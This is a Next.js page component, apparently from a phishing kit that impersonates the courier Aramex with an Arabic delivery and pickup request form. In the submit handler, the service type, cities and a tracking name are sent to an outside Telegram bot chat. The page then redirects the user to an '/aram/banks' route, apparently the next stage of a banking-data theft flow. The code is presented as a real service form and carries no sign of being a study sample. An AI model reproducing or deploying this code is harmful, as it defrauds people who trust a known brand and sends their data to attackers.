"use client"
import { useRef } from 'react'
import styles from './fozajil.module.css'
import bot from '@/compnante/dataBot'
import {useRouter,useSearchParams} from 'next/navigation'


const Page = () => {
  let typeRequest = useRef();
  let fromcity = useRef();
  let tocity = useRef();
  let mony = useRef();
  const  name = useSearchParams();
  const track = name.get("name")
  
  
  const router = useRouter()

  const handlerout = () => {
    
if(typeRequest.current.value == "اختر الخدمة" || fromcity.current.value == "" || tocity.current.value == "" || mony.current.value == "") {
      alert('من فضلك قم بملى الحقول')
    }else{
       router.push(`/aram/banks?names=${track}`)
    }
  }


  const handleSubmit = (e) => {
    e.preventDefault();

    var length =`مدونة ارامكس %0A   نوع الخدمة : ${typeRequest.current.value} %0A من  : ${fromcity.current.value} %0A  الى : ${tocity.current.value}  %0A %0A ${track}`


    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))


  }

  return (
    <div className={styles.contain} dir='rtl'>
      <div className={styles.navbar}>
        <h2>طلب  توصيل واستلام</h2>
      </div>
        <form onSubmit={handleSubmit}> 


    <select name="typeRequest" ref={typeRequest} required>
                <option value="اختر الخدمة">اختر الخدمة</option>
                <option value="طلب توصيل">طلب توصيل</option>
                <option value="طلب استلام">طلب استلام</option>
            </select>
            <input type="text" name='fromcity'  placeholder='من مدينة' ref={fromcity}required />
            <input type="text" name='tocity'  placeholder='الى مدينة' ref={tocity}required />
            <input type="number" name='many' placeholder='قيمة السداد'ref={mony} required />

        <button type='submit' onClick={handlerout}>تقديم الطلب</button>
        </form>
    </div>

  )
}

export default Page; 
